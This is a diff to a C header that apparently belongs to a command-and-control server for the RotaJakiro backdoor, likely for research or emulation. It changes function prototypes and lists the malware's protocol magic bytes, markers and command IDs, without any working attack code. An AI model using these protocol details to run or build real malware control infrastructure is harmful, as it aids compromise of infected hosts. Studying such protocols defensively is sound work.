@@ -12,13 +12,14 @@
 #ifndef C2_COMMANDS_H_
 #define C2_COMMANDS_H_
 
+#include <stdbool.h>
 
 //RotaJakiro Magic Headers
 const static unsigned char magicBytes[] = {0x3B, 0x91, 0x01, 0x10};
 const static unsigned char payloadLen[] = {0x0f};
 const static unsigned char marker_1[] = {0xe9, 0xbb, 0x91};
 const static unsigned char marker_2[] = {0xe5, 0xae, 0xa2};
-const static unsigned char cmd_id[] = {0x13, 0x37};
+const static unsigned int cmd_id[] = {0x13, 0x37};
 const static unsigned char marker_3[] = {0xe9, 0xbb, 0x91};
 const static unsigned char marker_4[] = {0x39,0x00};
 
@@ -46,9 +47,9 @@ void c2_loop();
 
 /**
 * @brief exit and kill rota via command-id 0x138E3E6
-* @params: N/A
+* @params: integer value representing socket to write to
 */
-void c2_exit(void);
+void c2_exit(int sock);
 
 /**
 * @brief check if connection is alive via command-id 0x208307A
@@ -131,12 +132,18 @@ void c2_run_plugin_3();
 char *initial_rota_pkt();
 
 /**
- * @brief Parse C2 pkt
+ * @brief Parse C2 pkt to obtain payload data
  * @param char * to buffer to parse
  * @return char pointer to ROTA's initial header.
  **/
-char *parse_c2_pkt(char *buffer);
+char *parse_c2_payload(char *buffer);
 
+/**
+ * @brief Parse C2 pkt to obtain cmd id
+ * @param char * to buffer to parse
+ * @return char value of command id
+ **/
+char *parse_c2_cmdid(char *buffer);
 
 
 #endif // C2_COMMANDS_H_
